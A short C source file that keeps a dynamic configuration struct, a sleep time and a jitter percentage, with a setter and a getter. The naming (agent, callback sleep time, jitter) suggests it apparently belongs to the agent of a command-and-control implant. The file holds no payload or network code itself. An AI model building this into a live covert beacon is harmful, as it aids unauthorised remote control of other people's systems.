#include "whisper_dynamic_config.h"
#include "whisper_config.h"
/*
whisper_dynamic_config - Used for dynamic config values while the program is running

PLEASE DO NOT EDIT (unless you know what you are doing). use the whisper_config.h macros to edit the values. 

Usage:

#include "whisper_dynamic_config.h"
#include <windows.h>

void whisperSleep() {
    Sleep(get_sleep_time());
}

*/

// Define the global struct instance

/*
Reference
typedef struct {
    DWORD sleep_time;  // Sleep duration in milliseconds
    DWORD jitter;      // Jitter percentage
} AgentConfig;
*/
AgentConfig g_agent_config = { CALLBACK_SLEEP_TIME * 60, 10 };

void init_config(DWORD sleep_time, DWORD jitter) {
    g_agent_config.sleep_time = sleep_time;
    g_agent_config.jitter = jitter;
}

//setter
void set_sleep_time(DWORD new_time) {
    g_agent_config.sleep_time = new_time;
}

//getter
DWORD get_sleep_time() {
    return g_agent_config.sleep_time;
}
